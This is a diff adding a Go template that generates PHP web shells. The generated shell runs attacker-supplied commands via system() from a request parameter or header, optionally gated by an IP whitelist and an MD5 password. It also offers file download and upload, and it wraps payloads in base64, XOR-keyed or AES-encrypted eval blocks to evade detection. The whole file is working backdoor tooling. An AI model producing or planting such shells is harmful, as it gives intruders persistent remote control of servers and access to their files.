@@ -1,0 +1,136 @@
+{{ if ne .CmdHeader "" }}
+  $cmd = $_SERVER['HTTP_{{ .CmdHeader }}'];
+{{ else }}
+
+{{ if ne .Method "GET" }}
+  parse_str(file_get_contents('php://input'), $_REQUEST);
+{{ end }}
+
+{{ if ne .Method "" }}
+  $cmd = $_REQUEST['{{ .CmdParam }}'];
+{{ end }}
+
+{{ end }}
+  $cmd = trim($cmd);
+
+
+{{ if .Whitelist }}
+  $whitelist = array({{ range $ip := .WhitelistSlice }}'{{ $ip }}',{{ end }});
+  if (!in_array($_SERVER['REMOTE_ADDR'], $whitelist)) {
+    die;
+  }
+{{- end }}
+
+
+{{ if ne .Password "" }}
+  $hash = '{{ .PasswordHash }}';
+{{ if ne .PasswordParam "" }}
+
+{{ if ne .Method "" }}
+  $pass = $_REQUEST['{{ .PasswordParam }}'];
+{{ end }}
+
+{{ else if ne .PasswordHeader "" }}
+  $pass = $_SERVER['HTTP_{{ .PasswordHeader }}'];
+{{ end }}
+  if (md5($pass) != $hash) {
+    die;
+  }
+{{- end }}
+
+
+{{ if .FileCapabilities }}
+  if (substr($cmd, 0, 4) === 'get ') {
+    $c = explode(' ', $cmd);
+    $path = $c[1];
+    if (!file_exists($path)) {
+      echo '$path not found';
+      die;
+    }
+    header("Content-Disposition: attachment; filename=$path");
+    header("Content-Type: application/octet-stream");
+    header("Content-Transfer-Encoding: binary");
+    header('Content-Length: ' . filesize($path));
+    readfile($path);
+    die;
+  } else if (substr($cmd, 0, 4) === 'put ') {
+    $c = explode(' ', $cmd);
+    $fileName = $c[1];
+    $destPath = basename($c[1]);
+    if (count($c) > 2) {
+      $destPath = $c[2];
+    }
+    if (file_exists($destPath)) {
+      echo $destPath.' already exists';
+      die;
+    }
+    file_put_contents($destPath, file_get_contents('php://input'));
+    echo 'Uploaded '.$fileName.' to '.$destPath;
+    die;
+  }
+{{ end }}
+
+  system($cmd);
+  die;
+
+
+
+{{- define "b64" }}
+eval(base64_decode('{{ .EncCode }}'))
+{{ end }}
+
+
+
+{{ define "xor" }}
+{{ if ne .EncHeader "" -}}
+  $k = $_SERVER['HTTP_{{ .EncHeader }}'];
+{{ else if eq .Method "GET" -}}
+  $k = $_REQUEST['{{ .EncParam }}'];
+{{ else if eq .Method "POST" -}}
+  $k = json_decode(file_get_contents('php://input'), true)['{{ .EncParam }}'];
+{{ end -}}
+
+$e = base64_decode('{{ .EncCode }}');
+$d = "";
+for($i=0; $i<strlen($e); ) {
+  for($j=0; ($j<strlen($k) && $i<strlen($e)); $j++,$i++) {
+    $d .= $e{$i} ^ $k{$j};
+  }
+}
+eval($d);
+{{ end }}
+
+
+
+{{ define "aes" }}
+$s = "{{ .EncCode }}";
+
+$secret_key = 'key-asdf';
+$secret_iv = 'iv-asdf';
+
+$output = false;
+$encrypt_method = "AES-256-CBC";
+$key = hash('sha256', $secret_key);
+$key = hex2bin($key);
+$iv = hash('sha256', $secret_iv);
+echo $iv;
+$iv = hex2bin($iv);
+echo $iv;
+$iv = unpack('C*', $iv);
+echo $iv;
+$iv = array_slice($iv, 0, 16);
+echo $iv;
+$iv = array_map("chr", $iv);
+echo $iv;
+$iv = join($iv);
+//$iv = substr($iv, 0, 16);
+
+echo $iv;
+
+$output = openssl_decrypt($s, "AES-256-CBC", $key, 0, $iv);
+
+echo $output;
+
+eval($output);
+
+{{ end }}
